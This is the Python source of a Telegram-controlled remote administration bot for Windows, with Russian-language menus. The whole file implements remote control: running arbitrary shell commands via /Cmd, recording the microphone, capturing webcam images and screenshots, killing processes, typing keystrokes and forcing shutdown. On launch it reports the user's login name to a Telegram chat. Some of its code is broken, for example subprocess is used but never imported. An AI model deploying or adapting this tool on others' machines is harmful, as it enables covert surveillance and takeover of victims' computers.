import telebot
import os
import re
import sys
import webbrowser as wb
import time
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import ctypes
import keyboard
import pyautogui as pg
from keyboard import write 
import wave
import pyaudio
import datetime
import requests
from bs4 import BeautifulSoup as BS
import lxml

from core.Screen	import *
from core.Tasklist  import *
from core.Taskkill  import *
from core.Webcam    import *

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)

with open("token.txt","r") as file:
	variable = file.read()

with open("chatid.txt","r") as file:
	hole = file.read()

with open("join.jpg","rb") as file:
	picture = file.read()

bot = telebot.TeleBot(variable)

try:
	os.mkdir("C://Windows//Temp//TelegramBot//")

except:
	Directory = "C://Windows//Temp//TelegramBot//"

Directory = "C://Windows//Temp//TelegramBot//"

CurrentName = os.path.basename(sys.argv[0])

menu = telebot.types.ReplyKeyboardMarkup()
buttonstart = telebot.types.KeyboardButton('/start')
button1 = telebot.types.KeyboardButton('/Power\n🔴')
button3 = telebot.types.KeyboardButton('/Screen\n🖼')
button4 = telebot.types.KeyboardButton('/Microphone\n🔊')
button6 = telebot.types.KeyboardButton('/Tasklist\n📄')
button7 = telebot.types.KeyboardButton('/Taskkill\n💀')
button14 = telebot.types.KeyboardButton('/2\n➡')
menu.row(button1, button4, button14)
menu.row(button3, button7, button6)

soap = telebot.types.InlineKeyboardMarkup()
button = telebot.types.InlineKeyboardButton('🔉 Уменьшить звук', callback_data='down')
button1 = telebot.types.InlineKeyboardButton('🔊 Увеличить звук', callback_data='upupup')
button2 = telebot.types.InlineKeyboardButton('🔈 Включить мут', callback_data='mute')
button3 = telebot.types.InlineKeyboardButton('🔉 Убрать мут', callback_data='unmute')
soap.row(button)
soap.row(button1)
soap.row(button2, button3)

menu2 = telebot.types.ReplyKeyboardMarkup()
button9 = telebot.types.KeyboardButton('/URL\n🔗')
button10 = telebot.types.KeyboardButton('/Message\n💛')
button11 = telebot.types.KeyboardButton('/Cmd\n⚫')
button12 = telebot.types.KeyboardButton('/Webcam\n📸')
button13 = telebot.types.KeyboardButton('/Text\n⌨')
button14 = telebot.types.KeyboardButton('/1\n⬅')
menu2.row(button14, button9, button11)
menu2.row(button13, button12, button10)

main = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('☠ Убить все процессы', callback_data='taskkill all')
button2 = telebot.types.InlineKeyboardButton('⬇ Свернуть вкладки', callback_data='roll your neck')
main.row(button1)
main.row(button2)

main2 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('⭕ Гибернация', callback_data='hibernate')
button2 = telebot.types.InlineKeyboardButton('🛑 Выключить', callback_data='shutdown')
button3 = telebot.types.InlineKeyboardButton('🔃 Перезагрузка', callback_data='restart')
button4 = telebot.types.InlineKeyboardButton('🔒 Завершить сеанс', callback_data='logoff')
button5 = telebot.types.InlineKeyboardButton('⏱ По таймеру', callback_data='time')
button6 = telebot.types.InlineKeyboardButton('📛 Отключить таймер', callback_data='stoptimer')
button7 = telebot.types.InlineKeyboardButton('🌝 Сон', callback_data='moon')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button7)
main2.row(button5)
main2.row(button6)

def Microphone(File, Seconds):
	CHUNK = 1024
	FORMAT = pyaudio.paInt16
	CHANNELS = 2
	RATE = 44100
	RECORD_SECONDS = float(Seconds)
	WAVE_OUTPUT_FILENAME = File
	p = pyaudio.PyAudio()
	stream = p.open(format=FORMAT,
					channels=CHANNELS,
					rate=RATE,
					input=True,
					frames_per_buffer=CHUNK)
	frames = []
	for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
		data = stream.read(CHUNK)
		frames.append(data)
	stream.stop_stream()
	stream.close()
	p.terminate()
	wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
	wf.setnchannels(CHANNELS)
	wf.setsampwidth(p.get_sample_size(FORMAT))
	wf.setframerate(RATE)
	wf.writeframes(b''.join(frames))
	wf.close()

url = "https://www.currency.me.uk/convert/usd/rub"
r = requests.get(url)
soup = BS(r.text, 'lxml')
curs = soup.find("span", {"class" : "mini ccyrate"}).text

hour = int(datetime.datetime.now().hour)
if hour >= 0 and hour < 12:
	try:
		bot.send_photo(hole, picture,f'''

🔆🌐 Онлайн!

👋 Приветствую вас {os.getlogin()}
🌞Доброе Утро!

💸 Курс рубля - {curs}''')

	except:
		pass

elif hour >= 12 and hour < 18:
	try:
		bot.send_photo(hole, picture,f'''

🔆🌐 Онлайн!

👋 Приветствую вас {os.getlogin()}
☀Доброго Дня!

💸 Курс рубля - {curs}''')

	except:
		pass

else:
	try:
		bot.send_photo(hole, picture,f'''

🔆🌐 Онлайн!

👋 Приветствую вас {os.getlogin()}
🌙Доброй Ночи

💸 Курс рубля - {curs}''')

	except:
		pass

@bot.message_handler(regexp='/help')
def help(command):
	bot.send_message(command.chat.id, '''
	__Cписок команд:__

	/Power (параметр) - управление питанием компьютера

	/Microphone (в секундах) - запись микрофона

	/Screen - отправка скриншота компьютера

	/Taskkill (процесс) - убивает процесс

	/Tasklist - отправка активных процессов

	/URL (ссылка) - открывает отправленную ссылку

	/Cmd (команда) - написание команды в командной строке

	/Text (текст) - написание текста

	/Webcam - отправка веб-камеры

	/Message - отправка сообщения как ошибку
	''', parse_mode='MarkdownV2')

def dsendmess(call, text):
	try:
		bot.send_message(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
	except:
		pass

def sendmess(call, text):
	try:
		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
	except:
		pass

@bot.callback_query_handler(func=lambda call: True)
def CallbackInline(command):
	if command.message:
		if command.data == 'hibernate':
			sendmess(command, "⭕ Гибернация...")
			os.system("shutdown -s /t 0 /f")
			sendmess(command, "Готово")
			
		elif command.data == 'shutdown':
			sendmess(command, "🛑 Выключение...")
			os.system("shutdown -s /t 0 /f")
			sendmess(command, "Готово")

		elif command.data == 'restart':
			sendmess(command, "🔃 Перезагрузка...")
			os.system("shutdown -r /t 0 /f")
			sendmess(command, "Готово")

		elif command.data == 'logoff':
			sendmess(command, "🔒 Выход...")
			os.system("shutdown -l /f")
			sendmess(command, "Готово")

		elif command.data == 'moon':
			sendmess(command, "Сон...")
			os.system("shutdown /h")
			sendmess(command, "🌝 Компьютер переведён в спящий режим")

		elif command.data == 'stoptimer':
			sendmess(command, "Отключение таймера...")
			os.system('shutdown /a')
			sendmess(command, "⛔ Таймер остановлен")

		elif command.data == 'time':
			sendmess(command, "/timer <в секундах>")

		elif command.data == 'taskkill all':
			subprocess.call('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + CurrentName + '"',
				shell=True)
			subprocess.call('explorer.exe',
				shell=True)

		elif command.data == 'wind':
			pg.hotkey('win', 'd')
			bot.send_message(message.chat.id, 'Готово')

		elif command.data == 'down':
			keyboard.send("volume down")
			#sendmess(command, "Звук уменьшен на 2")

		elif command.data == 'upupup':
			keyboard.send("volume up")
			#sendmess(command, "Звук увеличени на 2🔊")

		elif command.data == 'mute':
			keyboard.send("volume mute")
			#sendmess(command, "Звук убран")

		elif command.data == 'unmute':
			keyboard.send("volume mute")
			dsendmess(command, "Мут убран🔉🔊🔈")
			#volmic()

		elif command.data == 'roll your neck':
			pg.hotkey("win", "d")

@bot.message_handler(regexp='/Microphone')
def Audio(command):
	#message1 = bot.send_message(message.chat.id, message.id)
	bot.delete_message(command.chat.id, command.id)
	try:
		Seconds = re.split('/Microphone',command.text, flags=re.I)[1]
		try:
			File = Directory + 'Audio.wav'
			Microphone(File, Seconds)
			Audio = open(File, 'rb')
			bot.send_voice(command.chat.id, Audio)
		except ValueError:
			bot.reply_to(command, 'Укажите время записи в секундах', parse_mode='Markdown')
		except:
			bot.reply_to(command, 'Микрофон не найден', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, '🔴 Введите время в секундах /Microphone <секунды>', parse_mode='Markdown')



@bot.message_handler(regexp='/Cmd')
def CMD(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		Command = re.split('/CMD ', command.text, flags=re.I)[1]
		CMD = subprocess.Popen(Command,
			shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
		Lines = []
		for Line in CMD.stdout.readlines():
			Line = Line.strip()
			if Line:
				Lines.append(Line.decode('cp866'))
				Output = '\n'.join(Lines)
		bot.send_message(command.chat.id, Output)
	except:
		try:
			Command = re.split('/CMD ', command.text, flags=re.I)[1]
			SplittedText = telebot.util.split_string(Output, 4096)
			for Output in SplittedText:
				bot.send_message(command.chat.id, Output)
		except UnboundLocalError:
			bot.reply_to(command, 'Команда отправлена', parse_mode='Markdown')
		except:
			bot.send_message(command.chat.id, '🔴 Введите команду /Cmd <команда>', parse_mode='Markdown')

@bot.message_handler(regexp='/timer')
def timer(command):
	bot.delete_message(command.chat.id, command.id)
	timer = re.split('/timer', command.text, flags=re.I)[1]
	os.system("shutdown -s -t " + timer)
	bot.send_message(command.chat.id, 'Готово')

@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
	try:

		Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
		KillProcess(Process)

		if not Process.endswith('.exe'):
			Process = Process + '.exe'

		bot.reply_to(command, 'Процесс *' + Process + '* завершён', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'/Taskkill (название)'
			'\n'
			#'\n*› /Taskkill*'
			'\n'
			'\nАктивные окна'
			'\n'
			'\n`' + WindowTitle() + '`',
				reply_markup=main, parse_mode='Markdown')

@bot.message_handler(regexp='/Text')
def sendword(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		Text = re.split('/Text ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '⌨ Печать...', parse_mode='Markdown')
		write(Text)
		bot.send_message(command.chat.id, '✔ Готово', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, '🔴 Напишите слово которое хотите написать /Text <слово или предложение>')

@bot.message_handler(regexp='/Message')
def messagewin(command):
	bot.delete_message(command.chat.id, command.id)
	try:

		Message1 = re.split('/Message ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '💌 Сообщение отправлено', parse_mode='Markdown')
		ctypes.windll.user32.MessageBoxW(0, Message1, u'', 0x40)

	except:
		bot.send_message(command.chat.id, '🔴 Введите сообщение /Message <сообщение>', parse_mode='Markdown')


@bot.message_handler(regexp='/Webcam')
def Webcam(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Webcam.jpg'

		if os.path.exists(File):
			os.remove(File)

		WebcamScreenshot(File)
		Webcam = open(File, 'rb')
		bot.send_photo(command.chat.id, Webcam)
	except:
		bot.send_message(command, '🔴 Веб камера на обнаружена', parse_mode='Markdown')

@bot.message_handler(commands=["URL"])
def OpenUrl(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		URL = re.split('/URL ', command.text, flags=re.I)[1]
		if not URL.startswith('http'):
			URL = 'http://' + URL
		#subprocess.call('start ' + URL, shell=True)
		wb.open(URL)
		bot.send_message(command.chat.id, '✔ Сайт открыт', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, '🔴 Отправьте ссылку --> /URL <ссылка>', parse_mode='Markdown')

@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '`' + ProcessList() + '`', parse_mode='Markdown')

@bot.message_handler(commands=["start"])
def start(message):
	#bot.delete_message(command.chat.id, command.id)
	bot.send_message(message.chat.id, "hello", reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=["Screen"])
def Screen(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Screenshot.jpg'
		Screenshot(File)
		Screen = open(File, 'rb')
		bot.send_photo(command.chat.id, Screen)

	except:
		pass

@bot.message_handler(commands=['1'])
def one(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '⬅ 1 страница', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['2'])
def two(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '➡ 2 страница', reply_markup=menu2, parse_mode='Markdown')

@bot.message_handler(commands=['menu', 'Menu'])
def manu(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '🧩 Меню', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['Power'])
def Power(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '🖥 Выберите как выключить систему', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Volume'])
def volume(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '🔊 Выберите параметр управления звука', reply_markup=soap, parse_mode='Markdown')

bot.polling(True)
